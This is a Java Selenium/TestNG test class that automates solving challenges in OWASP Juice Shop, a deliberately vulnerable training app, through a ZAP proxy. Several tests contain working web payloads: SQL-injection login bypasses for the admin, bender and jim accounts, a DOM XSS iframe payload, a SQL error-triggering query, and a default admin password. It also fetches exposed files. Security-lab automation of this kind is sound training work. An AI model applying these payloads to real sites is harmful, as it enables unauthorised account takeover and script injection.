package tests.JuiceShop;

import pom.JuiceShop.LoginPage;
import pom.JuiceShop.SearchPage;

import utilities.ScreenshotHelper;

import org.openqa.selenium.Alert;
import org.openqa.selenium.By;
import org.openqa.selenium.json.Json;
import org.openqa.selenium.support.ui.ExpectedConditions;
import org.openqa.selenium.support.ui.WebDriverWait;
import org.openqa.selenium.WebElement;

import org.testng.Assert;
import org.testng.annotations.Test;
import automation.ZapManager;

import java.time.Duration;
import java.util.List;
import java.util.Map;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.net.InetSocketAddress;
import java.net.ProxySelector;


public class JuiceShopChallengesTest extends JuiceShopBaseTest
{
    @Test(priority = 1)
    public void testSqlInjectionLoginBypass()
    {
        var driver = ZapManager.getDriver();
        driver.get(baseUrl);

        LoginPage loginPage = new LoginPage(driver);
        loginPage.dismissInitialOverlays();
        loginPage.navigateToLoginViaNavbar();

        // Execute the classic Juice Shop SQL Injection challenge: admin login bypass
        loginPage.login("admin@juice-sh.op'--", "anything");

        // Verify redirect to search and successful administrative session
        new WebDriverWait(driver, Duration.ofSeconds(10))
                .until(ExpectedConditions.urlContains("/search"));

        ScreenshotHelper.capture(driver);
        Assert.assertTrue(loginPage.isUserLoggedIn(), "SQL Injection authentication bypass failed: user is not logged in.");
    }

    @Test(priority = 2)
    public void testDomXssChallenge() {
        var driver = ZapManager.getDriver();
        driver.get(baseUrl);

        SearchPage searchPage = new SearchPage(driver);
        searchPage.dismissInitialOverlays();

        String payload = "<iframe src=\"javascript:alert(`xss`)\">";
        searchPage.search(payload);

        WebDriverWait wait = new WebDriverWait(driver, Duration.ofSeconds(10));
        Alert alert = wait.until(ExpectedConditions.alertIsPresent());

        Assert.assertEquals(alert.getText(), "xss", "DOM XSS payload did not execute correctly.");
        alert.accept();

        ScreenshotHelper.capture(driver);
        System.out.println("DOM XSS payload executed successfully.");
    }

    @Test(priority = 3)
    public void testConfidentialDocumentChallenge() throws Exception {
        HttpResponse<String> response = sendGet("/ftp/acquisitions.md");
        ScreenshotHelper.captureResponse(ZapManager.getDriver(), response);

        Assert.assertEquals(response.statusCode(), 200, "Confidential document was not accessible.");
        Assert.assertFalse(response.body().isBlank(), "Confidential document was empty.");

        assertChallengeSolved("Confidential Document");
    }

    @Test(priority = 4)
    public void testExposedMetricsChallenge() throws Exception {
        HttpResponse<String> response = sendGet("/metrics");

        System.out.println("Metrics status: " + response.statusCode());
        System.out.println("Metrics URL: " + response.request().uri());

        Assert.assertEquals(response.statusCode(), 200);
        Assert.assertTrue(response.body().contains("# HELP"));

        var driver = ZapManager.getDriver();
        driver.get(baseUrl + "#/score-board");

        new WebDriverWait(driver, Duration.ofSeconds(15))
                .until(ExpectedConditions.visibilityOfElementLocated(By.cssSelector("app-score-board")));

        ScreenshotHelper.capture(driver);
        assertChallengeSolved("Exposed Metrics");
    }

    @Test(priority = 5)
    public void testAdminSectionChallenge() {
        var driver = ZapManager.getDriver();
        driver.get(baseUrl);

        LoginPage loginPage = new LoginPage(driver);
        loginPage.dismissInitialOverlays();
        loginPage.navigateToLoginViaNavbar();
        loginPage.login("admin@juice-sh.op'--", "anything");

        WebDriverWait wait = new WebDriverWait(driver, Duration.ofSeconds(15));
        wait.until(ExpectedConditions.urlContains("/search"));

        driver.get(baseUrl + "#/administration");
        wait.until(ExpectedConditions.visibilityOfElementLocated(
                By.cssSelector("app-administration")));

        ScreenshotHelper.capture(driver);
        assertChallengeSolved("Admin Section");
    }

    @Test(priority = 6)
    public void testSecurityPolicyChallenge() {
        var driver = ZapManager.getDriver();

        driver.get(java.net.URI.create(baseUrl).resolve("/.well-known/security.txt").toString());

        String content = driver.findElement(By.tagName("body")).getText();
        Assert.assertTrue(content.contains("Contact:"), "Security policy was not retrieved.");

        ScreenshotHelper.capture(driver);
        assertChallengeSolved("Security Policy");
    }

    @Test(priority = 7)
    public void testMissingEncodingChallenge() {
        var driver = ZapManager.getDriver();

        String path = "/assets/public/images/uploads/" +
                "%E1%93%9A%E1%98%8F%E1%97%A2-%23zatschi-%23whoneedsfourlegs-1572600969477.jpg";

        driver.get(java.net.URI.create(baseUrl).resolve(path).toString());

        Assert.assertTrue(driver.getCurrentUrl().contains("%23zatschi"),
                "Encoded image request was not made.");

        ScreenshotHelper.capture(driver);
        assertChallengeSolved("Missing Encoding");
    }

    @Test(priority = 8)
    public void testExtraLanguageChallenge() {
        var driver = ZapManager.getDriver();

        driver.get(java.net.URI.create(baseUrl).resolve("/assets/i18n/tlh_AA.json").toString());

        ScreenshotHelper.capture(driver);
        assertChallengeSolved("Extra Language");
    }

    @Test(priority = 9)
    public void testPrivacyPolicyChallenge() {
        var driver = ZapManager.getDriver();
        driver.get(baseUrl + "#/privacy-security/privacy-policy");

        WebDriverWait wait = new WebDriverWait(driver, Duration.ofSeconds(15));
        wait.until(ExpectedConditions.visibilityOfElementLocated(By.cssSelector("app-privacy-policy .privacy-policy")));

        wait.until(ExpectedConditions.presenceOfElementLocated(By.cssSelector("app-privacy-policy img[src$='81px.png']")));

        ScreenshotHelper.capture(driver);
        assertChallengeSolved("Privacy Policy");
    }

    @Test(priority = 11)
    public void testErrorHandlingChallenge() {
        var driver = ZapManager.getDriver();

        String url = java.net.URI.create(baseUrl).resolve("/rest/products/search?q=%27%3B").toString();

        driver.get(url);

        WebDriverWait wait = new WebDriverWait(driver, Duration.ofSeconds(10));
        wait.until(ExpectedConditions.textToBePresentInElementLocated(By.tagName("body"), "SQLITE_ERROR"));

        ScreenshotHelper.capture(driver);
        assertChallengeSolved("Error Handling");
    }

    @Test(priority = 12)
    public void testPasswordStrengthChallenge() {
        var driver = ZapManager.getDriver();
        driver.get(baseUrl);

        LoginPage loginPage = new LoginPage(driver);
        loginPage.dismissInitialOverlays();
        loginPage.navigateToLoginViaNavbar();

        // Authenticate using the administrator's original weak password.
        loginPage.login("admin@juice-sh.op", "admin123");

        WebDriverWait wait = new WebDriverWait(driver, Duration.ofSeconds(10));
        wait.until(ExpectedConditions.urlContains("/search"));

        Assert.assertTrue(loginPage.isUserLoggedIn(), "Administrator login failed.");

        ScreenshotHelper.capture(driver);
        assertChallengeSolved("Password Strength");
    }

    @Test(priority = 13)
    public void testLoginBenderChallenge() {
        var driver = ZapManager.getDriver();
        driver.get(baseUrl);

        LoginPage loginPage = new LoginPage(driver);
        loginPage.dismissInitialOverlays();
        loginPage.navigateToLoginViaNavbar();

        loginPage.login("bender@juice-sh.op'--", "anything");

        WebDriverWait wait = new WebDriverWait(driver, Duration.ofSeconds(10));
        wait.until(ExpectedConditions.urlContains("/search"));

        Assert.assertTrue(loginPage.isUserLoggedIn(), "Bender login bypass failed.");

        ScreenshotHelper.capture(driver);
        assertChallengeSolved("Login Bender");
    }

    @Test(priority = 14)
    public void testLoginJimChallenge() {
        var driver = ZapManager.getDriver();
        driver.get(baseUrl);

        LoginPage loginPage = new LoginPage(driver);
        loginPage.dismissInitialOverlays();
        loginPage.navigateToLoginViaNavbar();

        loginPage.login("jim@juice-sh.op'--", "anything");

        WebDriverWait wait = new WebDriverWait(driver, Duration.ofSeconds(10));
        wait.until(ExpectedConditions.urlContains("/search"));

        Assert.assertTrue(loginPage.isUserLoggedIn(), "Jim login bypass failed.");

        ScreenshotHelper.capture(driver);
        assertChallengeSolved("Login Jim");
    }

    @Test(priority = 15)
    public void testAccessLogChallenge() {
        var driver = ZapManager.getDriver();
        driver.get(baseUrl + "/support/logs/");

        WebDriverWait wait = new WebDriverWait(driver, Duration.ofSeconds(15));
        WebElement logLink = wait.until(ExpectedConditions.presenceOfElementLocated(
                By.cssSelector("a[href*='access.log']")));

        String logUrl = logLink.getAttribute("href");
        Assert.assertNotNull(logUrl, "No access log link was found.");

        ScreenshotHelper.capture(driver);
        driver.get(logUrl);

        assertChallengeSolved("Access Log");
    }

    @Test(priority = 16)
    public void testMisplacedIaCFilesChallenge() {
        var driver = ZapManager.getDriver();
        driver.get(baseUrl + "/infrastructure/terraform/main.tf");

        WebDriverWait wait = new WebDriverWait(driver, Duration.ofSeconds(15));
        wait.until(ExpectedConditions.textToBePresentInElementLocated(
                By.tagName("body"), "provider"));

        String content = driver.findElement(By.tagName("body")).getText();
        Assert.assertTrue(content.contains("resource"), "Terraform configuration was not exposed.");

        ScreenshotHelper.capture(driver);
        assertChallengeSolved("Misplaced IaC Files");
    }



    @Test(priority = 1000)
    public void testScoreBoardChallenge() {
        var driver = ZapManager.getDriver();
        driver.get(baseUrl);

        LoginPage loginPage = new LoginPage(driver);
        loginPage.dismissInitialOverlays();

        driver.get(baseUrl + "#/score-board");

        WebDriverWait wait = new WebDriverWait(driver, Duration.ofSeconds(15));

        wait.until(ExpectedConditions.visibilityOfElementLocated(By.cssSelector("app-score-board")));
        wait.until(ExpectedConditions.visibilityOfElementLocated(By.cssSelector("challenge-card")));

        Assert.assertTrue(driver.getCurrentUrl().contains("#/score-board"), "Score Board page did not load.");

        ScreenshotHelper.capture(driver);
        assertChallengeSolved("Score Board");
    }
    /**********************************************************************************************************************/
    // Helper functions
    private HttpResponse<String> sendGet(String path) throws Exception {
        URI proxyUri = URI.create("http://" + ZapManager.getProxyAddress());

        HttpClient client = HttpClient.newBuilder()
                .proxy(ProxySelector.of(new InetSocketAddress(proxyUri.getHost(), proxyUri.getPort())))
                .connectTimeout(Duration.ofSeconds(10))
                .build();

        HttpRequest request = HttpRequest.newBuilder()
                .uri(URI.create(baseUrl + path))
                .timeout(Duration.ofSeconds(15))
                .header("User-Agent", "JuiceShopSecurityAutomation/1.0")
                .GET()
                .build();

        HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());

        System.out.println("[HTTP] GET " + path + " -> " + response.statusCode());
        return response;
    }

    @SuppressWarnings("unchecked")
    private void assertChallengeSolved(String challengeName) {
        var driver = ZapManager.getDriver();
        driver.get(baseUrl + "/api/Challenges");

        String response = driver.findElement(By.tagName("body")).getText();
        Map<String, Object> json = new Json().toType(response, Map.class);
        List<Map<String, Object>> challenges = (List<Map<String, Object>>) json.get("data");

        Assert.assertNotNull(challenges, "Challenge API returned no challenge list.");

        for (Map<String, Object> challenge : challenges) {
            if (challengeName.equals(challenge.get("name"))) {
                Assert.assertEquals(challenge.get("solved"), Boolean.TRUE,
                        "Challenge not completed: " + challengeName);

                System.out.println("[SOLVED] " + challengeName);
                return;
            }
        }

        Assert.fail("Challenge not found: " + challengeName);
    }


}